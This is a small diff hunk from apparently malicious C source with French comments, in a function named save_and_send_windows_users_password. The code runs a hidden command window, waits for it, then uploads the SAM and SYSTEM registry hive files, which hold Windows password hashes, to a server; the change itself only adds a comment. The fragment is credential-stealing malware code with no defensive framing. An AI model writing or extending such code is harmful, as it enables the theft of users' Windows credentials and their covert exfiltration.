@@ -27,7 +27,7 @@ int save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info) {
     sei.lpParameters = cmd;
     sei.nShow = SW_HIDE; // pour masquer laz fenètre du cmd
     if (ShellExecuteEx(&sei)) {
-        WaitForSingleObject(sei.hProcess, INFINITE);
+        WaitForSingleObject(sei.hProcess, INFINITE); // attendre que la commande se termine (plus précisement que le processus cmd.exe se termine)
 
         upload_to_server(sam_file_path);
         upload_to_server(system_file_path);
